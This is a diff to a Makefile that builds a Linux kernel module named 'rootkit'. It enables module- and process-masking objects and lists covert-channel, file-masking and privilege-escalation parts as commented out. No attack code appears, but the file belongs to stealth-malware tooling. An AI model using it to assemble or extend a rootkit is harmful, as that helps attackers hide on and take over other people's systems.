@@ -15,7 +15,7 @@
 #       Name: Nedko Stefanov Nedkov                                           #
 #       Email: nedko.stefanov.nedkov@gmail.com                                #
 #                                                                             #
-#   Date: November 2015                                                       #
+#   Date: December 2015                                                       #
 #                                                                             #
 #   Usage: This Makefile compiles the module `rootkit.c`                      #
 #                                                                             #
@@ -27,9 +27,9 @@ SYSMAP_HEADER = ./sysmap.h
 KDIR = /lib/modules/$(shell uname -r)/build
 TARGET = rootkit
 obj-m += $(TARGET).o
-#$(TARGET)-y := process_masking.o
-#file_masker.o
-# covert_channel.o file_masking.o privil_escalating.o
+$(TARGET)-y := module_masking.o process_masking.o
+#covert_channel.o file_masking.o priviledge_escalating.o
+ccflags-y = -Wno-unused-function
 
 all:	$(SYSMAP_HEADER)
 	make -C $(KDIR) M=$(PWD) modules
